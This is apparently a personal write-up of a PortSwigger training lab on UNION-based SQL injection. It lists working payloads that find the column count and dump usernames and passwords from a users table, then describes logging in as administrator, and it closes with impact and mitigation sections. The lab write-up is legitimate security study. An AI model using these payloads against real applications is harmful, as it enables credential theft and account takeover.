# SQL injection UNION attack, retrieving data from other tables

**Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
**Category:**  SQL Injection  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Vulnerability
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

## Exploitation


### Steps
1. Intercepted the HTTP request after selecting a product category.
2. Identified the vulnerable `category` GET parameter and sent the request to Repeater.
3. Modified the `category` parameter by appending `'+UNION+SELECT+NULL--` and observed an **Internal Server Error** response.
4. Determined that the payload `'+UNION+SELECT+NULL,NULL--` returned a valid response, indicating that the query contained two columns.
5. Replaced the `NULL` values with test strings using the payload `'+UNION+SELECT+'usertest','passtest'--` and confirmed that both columns accepted string data.
6. Retrieved usernames and passwords from the `users` table using the payload `'+UNION+SELECT+username,+password+FROM+users--`. The response contained credentials for users such as `wiener` and `carlos`.
7. Logged in as `wiener` using the retrieved credentials, confirming the validity of the extracted data.
8. Logged in as `carlos` using the retrieved credentials, confirming that the attack successfully disclosed multiple user accounts.
9. Modified the request to target the `All` category:
   ```http
   /filter?category=All'+UNION+SELECT+username,+password+FROM+users--
   ```
   This returned the administrator credentials.
10. Logged in as the `administrator` user and solved the lab.

### Payload
```http
/filter?category=All'+UNION+SELECT+username,+password+FROM+users--
```

### Shortcut
1. Determine the number of columns:
```sql
'+UNION+SELECT+NULL,NULL--
```
2. Confirm that both columns accept string data:
```sql
'+UNION+SELECT+'usertest','passtest'--
```
3. Retrieve usernames and passwords from the `users` table:
```sql
'+UNION+SELECT+username,password+FROM+users--
```
4. Change the category parameter to `All` to retrieve the administrator credentials:
```http
/filter?category=All'+UNION+SELECT+username,password+FROM+users--
```
5. Log in as `administrator` using the extracted credentials.

## Impact
An attacker can extract sensitive information from arbitrary database tables, including usernames and passwords. If passwords are stored in plaintext, this can lead to account takeover, privilege escalation, and complete compromise of the application.

## Mitigation
Use parameterized queries (prepared statements) for all database interactions. Store passwords using strong one-way hashing algorithms (such as Argon2, bcrypt, or scrypt) instead of plaintext, and prevent detailed SQL errors from being exposed to users.

## Tools
- Burp Suite
- Repeater

## Notes
This lab demonstrates how previously identified information—such as the number of columns and compatible data types—can be combined to perform a complete UNION-based SQL injection attack. Once the correct query structure is known, attackers can retrieve data from arbitrary tables and use the disclosed credentials to gain unauthorized access.